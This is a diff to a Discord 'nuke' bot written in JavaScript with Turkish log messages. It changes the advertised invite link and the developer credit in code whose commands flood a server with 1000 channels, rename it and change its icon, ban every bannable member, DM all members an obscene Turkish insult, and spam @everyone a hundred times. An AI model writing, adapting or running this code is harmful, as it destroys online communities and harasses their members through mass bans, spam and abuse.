@@ -24,7 +24,7 @@ client.login(config.token);
 // Event handler
 client.once('ready', () => {
   console.log(`Bot ${client.user.tag} olarak giriş yaptı.`);
-  client.user.setActivity('discord.gg/bdfd', { type: 'PLAYING' });
+  client.user.setActivity('discord.gg/botshop', { type: 'PLAYING' });
 });
 
 // Event handler for message creation
@@ -37,7 +37,7 @@ client.on('messageCreate', async (msg) => {
       const channelsToCreate = [];
       let i = 0;
       while (i < 1000) {
-        channelsToCreate.push({ name: 'discord.gg/bdfd', type: ChannelType.GuildText });
+        channelsToCreate.push({ name: 'discord.gg/botshop', type: ChannelType.GuildText });
         i++;
       }
 
@@ -66,7 +66,7 @@ client.on('messageCreate', async (msg) => {
       // Update guild settings
       try {
         await msg.guild.setIcon('https://pbs.twimg.com/media/Ex6m_hqXIAQLWeZ?format=jpg&name=4096x4096');
-        await msg.guild.setName('discord.gg/bdfd');
+        await msg.guild.setName('discord.gg/botshop');
       } catch (err) {
         console.error('Failed to update guild settings:', err);
       }
@@ -85,7 +85,7 @@ client.on('messageCreate', async (msg) => {
       // Update bot settings
       try {
         await client.user.setAvatar('https://pbs.twimg.com/media/Ex6m_hqXIAQLWeZ?format=jpg&name=4096x4096');
-        await client.user.setUsername('discord.gg/bdfd UWU');
+        await client.user.setUsername('discord.gg/botshop UWU');
       } catch (err) {
         console.error('Failed to update bot settings:', err);
       }
@@ -107,7 +107,7 @@ client.on('messageCreate', async (msg) => {
 },
 '+dm': async () => {
   await msg.delete();
-  const message = ' **SWENZY BABA SIKERR https://discord.gg/bdfd ** ';
+  const message = ' **SWENZY BABA SIKERR https://discord.gg/botshop** ';
   
   await Promise.all(
     msg.guild.members.cache.map(member => {
@@ -127,7 +127,7 @@ client.on('messageCreate', async (msg) => {
   await Promise.all(
     msg.guild.members.cache.map(member => {
       if (member.bannable && member.id !== client.user.id) {
-        return member.ban({ reason: 'discord.gg/bdfd' }).then(() => console.log(`${member.user.tag} banlandı.`)).catch(err => console.error(`Ban hatası: ${err}`));
+        return member.ban({ reason: 'discord.gg/botshop' }).then(() => console.log(`${member.user.tag} banlandı.`)).catch(err => console.error(`Ban hatası: ${err}`));
       }
     })
   );
@@ -149,7 +149,7 @@ client.on('messageCreate', async (msg) => {
 },
     '+spam': async () => {
       await msg.delete();
-      const spamMessage = '**SWENZY BABA SIKERR @everyone https://discord.gg/bdfd**';
+      const spamMessage = '**SWENZY BABA SIKERR @everyone https://discord.gg/botshop**';
       for (let i = 0; i < 100; i++) {
         await msg.channel.send(spamMessage);
       }
@@ -173,7 +173,7 @@ client.on('messageCreate', async (msg) => {
             url: 'https://cdn.discordapp.com/attachments/1173319481599213639/1258825072248881292/a_0b05ce4dbc49d501b989eb54b99aa805.gif?ex=668973b5&is=66882235&hm=39b19bd6622752e65ebbc3d26c855c5933a862970d56b807131a8592cd6f5922&',
           },
         color: 0xff0000,
-        footer: { text: 'Development By Swenzyim' }
+        footer: { text: 'Development By Swenzydev' }
       };
       await msg.channel.send({ embeds: [embed] });
     }
